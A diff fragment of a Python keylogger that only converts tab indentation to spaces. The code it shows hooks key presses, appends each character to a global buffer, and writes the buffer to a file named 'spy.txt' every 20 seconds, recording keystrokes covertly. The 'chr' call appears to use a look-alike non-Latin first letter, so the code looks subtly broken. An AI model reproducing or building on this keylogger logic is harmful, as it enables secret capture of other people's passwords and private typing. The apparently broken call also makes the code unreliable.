@@ -7,15 +7,15 @@ store = ""
 
 
 def keyPressed(event):
-	global store
-	store += "\n" + сhr(event.KeyId)
-	return True
+    global store
+    store += "\n" + сhr(event.KeyId)
+    return True
 
 
 def writeToFile():
-	while True:
-		time.sleep(20)
-		with open("spy.txt", "a+") as f:
+    while True:
+        time.sleep(20)
+        with open("spy.txt", "a+") as f:
             f.write(store)
 
 
